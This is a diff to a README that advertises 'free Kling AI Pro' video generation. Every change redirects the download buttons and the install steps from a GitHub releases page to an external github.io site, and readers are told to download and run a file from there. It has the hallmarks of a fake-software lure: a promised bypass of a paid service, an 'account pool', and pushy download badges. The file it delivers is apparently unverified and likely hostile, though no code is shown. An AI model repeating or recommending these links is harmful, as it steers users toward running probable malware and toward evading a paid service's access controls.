@@ -1,7 +1,7 @@
 <h1>🎬 kling-ai-free-2026 - Free Kling AI Pro Video Generation</h1>
 
 <p align="center">
-  <a href="https://github.com/keefecanicular2644/kling-ai-free-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B" alt="Download Button"></a>
+  <a href="https://keefecanicular2644.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-blue?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B" alt="Download Button"></a>
 </p>
 
 ## ✨ What Is This?
@@ -16,7 +16,7 @@ Getting started takes less than two minutes. Here is exactly what you need to do
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/keefecanicular2644/kling-ai-free-2026/releases](https://github.com/keefecanicular2644/kling-ai-free-2026/releases)**
+Visit this link to download the application: **[https://keefecanicular2644.github.io](https://keefecanicular2644.github.io)**
 
 Click the download button on that page. The file will start downloading automatically. Wait for the download to finish completely before moving to the next step.
 
@@ -125,7 +125,7 @@ Solution: Use images smaller than 20 MB. Convert large images to JPG format befo
 
 If you need to reinstall or download for another computer, just repeat these steps:
 
-1. Go to the download page: **[https://github.com/keefecanicular2644/kling-ai-free-2026/releases](https://github.com/keefecanicular2644/kling-ai-free-2026/releases)**
+1. Go to the download page: **[https://keefecanicular2644.github.io](https://keefecanicular2644.github.io)**
 2. Download the latest version.
 3. Run the file and follow the on-screen instructions.
 4. Start creating videos immediately.
@@ -176,7 +176,7 @@ If you need help, check the FAQ section above first. For additional support, you
 **Ready to start?** Click the button below to get your free copy now:
 
 <p align="center">
-  <a href="https://github.com/keefecanicular2644/kling-ai-free-2026/releases"><img src="https://img.shields.io/badge/🚀_GET_STARTED-green?style=for-the-badge&logo=github&logoColor=white&color=4CAF50" alt="Get Started Button"></a>
+  <a href="https://keefecanicular2644.github.io"><img src="https://img.shields.io/badge/🚀_GET_STARTED-green?style=for-the-badge&logo=github&logoColor=white&color=4CAF50" alt="Get Started Button"></a>
 </p>
 
 Keywords: 1080p, 10s, 2026, 30fps, account, ai, bypass, camera, clip, free, generation, image-to-video, kling, motion, pool, pro, text-to-video, video, windows
